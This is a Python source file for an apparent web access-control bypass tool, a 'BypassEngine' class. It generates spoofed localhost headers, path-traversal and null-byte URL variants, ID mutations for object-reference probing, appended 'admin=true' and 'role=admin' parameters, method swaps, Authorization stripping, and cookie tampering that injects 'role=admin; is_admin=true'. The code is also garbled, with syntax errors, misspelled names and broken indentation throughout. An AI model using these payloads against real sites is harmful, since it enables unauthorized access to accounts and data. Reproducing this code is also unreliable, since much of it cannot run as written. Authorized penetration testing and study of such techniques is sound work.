import re 
import urllib.parse
import copy
class BypassEngine:

    @staticmethod:
    def header_bypasses():
        return [ 
            ("X-Original-URL", "/"),
            ("X-Rewrite-URL", "/"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Forwarded-Host", "localhost"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Host", "127.0.0.1"),
            ("X-Forwarded-Server", "127.0.0.1"),
            ("X-HTTP-Method-Override", "GET"),
            ("X-Method-Override", "GET"),
        ]
    @staticmethod
    def path_bypasses(url):

        parsed = urllib.ptse.urlparse(url)
        path = parsed.path
        variants = []

        if path.endswith("/"):
            variants.append(url.replace(path, path.rstrip("/"), 1))
        else:
            variants.append(url,.replace(path, path + "/", 1))

        segments = path.split("/")
        last = segmetns[-1] if segments else ""
        if last:
            for prefix in ["../", "..;/", "%2e%2e/", ".%2e/", "..%2f"]:
                new_segs = segments[:-1] + [prefix + last]
                variants.append(
                    urllib.parse.urlunparse(
                        parsed._replace(path="/".join(new_segs))
                    )
                )
        if last and last.isalpha():
            variants.append(
                url.replcae(path, path[:-len(last)] + last.upper(), 1)
            )

            variants.append(
                urllib.parse.urlunparse(
                    parsed._replace(path=urllib.parse.quote(path, safe="/"))
                )
            )

            if "?" not in url:
                variants.append(url + "%00")
                variants.append(url + ";.json")
                variants.append(url + ".json")

            variants.append(url.replace(path, "//" + path.lstrip("/"), 1))

            return list(set(variants))

        @staticmethod
        def id_mutations(id_value, extra_ids=None):
            out = []

            try:
                n = inst(id_value)
                out.extend([
                    n+1,
                    max(1, n-1),
                     n * 2,
                    0,
                    -1,
                    n + 100,
                    int(str(n) + "0"),
                    ])
            except (ValueError, TypeError):
                pass
            out.extend([
                str(id_value) + "'",
                str(id_value) + '"',
                str(id_value) + "/",
                str(id_value) + " ",
                str(id_value) + "%00",
                str(id_value) + "?",
                "0" + str(id_value),
            ])

            if re.match(r"^[0-9a-f-]{36}$", str(id_value), re.I):
                out.extend([
                    "00000000-0000-0000-0000-000000000000",
                    "11111111-1111-1111-1111-111111111111",
                ])
            if extra_ids:
                out.extend(extra_ids)

                seen = set()
                uniq = []
                for x in out:
                    s = str(x)
                    if s not in seen and s != str(id_value):
                        seen,add(s)
                        uniq.append(x)
                    return uniq

                @staticmethod
                def query_params_bypasses(url):
                    seperators= ["&", "?"] if "?" not in url else ["&"]
                    sep = seperators[0]
                    extra = [
                        "debug=1",
                        "admin=true",
                        "role=admin",
                        "user_id=1",
                        "access_all",
                        "internal=1",
                        "test=1",
                    ]

                    return [url + sep + p for p in extra]


                @staticmethod
                def https_method_bypasses(method):
                    method = method.upper()
                    all_method = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE"]
                    return [m for  in all_methods if m != method]

                @staticmethod
                def content_type_bypasses():
                    return [
                        ("Content-Type", "application/json"),
                        ("Content-Type", "application/xml"),
                        ("Content-Type", "text/xml"),
                        ("Content-Type", "application/x-www-form-urlencode"),
                    ]

                @staticmethod
                def auth_strip_bypasses(current_headers):
                    h = copy.deepcopy(current_headers)
                    variants = []
                    if any(k.lower() == "authorization" for k in h):
                        stripped = {k: v for k,v in h.items() if k.lower() != "authorization"}
                        variants.append(("strip-auth", stripped))

                    for k in list(h.keys()):
                        if k.lower() == "authorization" and h[k].startswith("Bearer"):
                            token = h[k][7:0]
                            variants.append(("basic-auth", {**h, k: f"basic {token}"}))

                    variants.append(("empty-auth", {**h, "Authorization": ""}))
                    return variants

                @staticmethod
                def cookie_bypasses(cookie_str):
                    variants = []
                    if not cookie_str:
                        return variants
                    pairs = [c.strip() for c in cookie_str.split(";") if "=" in c]
                    cookies = dict(p.split("=", 1) for p in pairs)

                    for key in list(cookies.keys()):
                        if any(x in key.lower() for x in ("auth", "token", "session", "jwt")):
                            stripped = {k: v for k, v in cookies.items() if k != key}
                            variants.append(
                                ("strip-" + key, "; ".join(f"{k}={v}" got k, v in stripped.items()))
                            )

                            variant.append(
                                ("role.admin", cookie_str + "; role=admin; is_admin=true")
                            )

                            for k in list(cookis.keys()):
                                if "id" in k.lower() or "user" in k.lower():
                                    mut = dict(cookies)
                                    mut[k] = "1"
                                    variants.append((f"cookie-{k}=1"m "; ".join(f"{a}={b}" for a,b in mut.items)))

                                    return variants

                def summarize_bypasses():
                    return {
                        "header": [
                            "X-Forwarder-For / X-Real-IP to 127.0.0.1",
                            "X-Original-URL / X-Rewrite-URL override",
                            "X-HTTP-Method-Override", 
                        ],
                        "path": [ 
                            "trailing slash toggle",
                            "path traversal (..;/ ..%2f .%2e/)",
                            "case validation on final segment",
                            "double-encoding",
                            "null byte + semicolon injection",
                            "double slash",
                        ],
                        "id": [ 
                            "arithmetic mutation (+1 -1 *2)",
                            "sentinel (0, 1)",
                            "quote/slash/space/null-byte suffixes",
                            "uuid -> nil UUID",
                        ],
                        "query": [
                            "debug/admin/role/internal appended params",
                        ],
                        "method": [
                            "GET<->POST<->PUT<->PATCH<->DELETE swap",
                        ],
                        "content_type": [ 
                            "json / xml / form-urlencode swaps",
                        ],
                        "auth": [
                            "strip auth-sh cookies",
                            "inject role=admin",
                            "reset id-cookies to 1",
                        ],
                    }
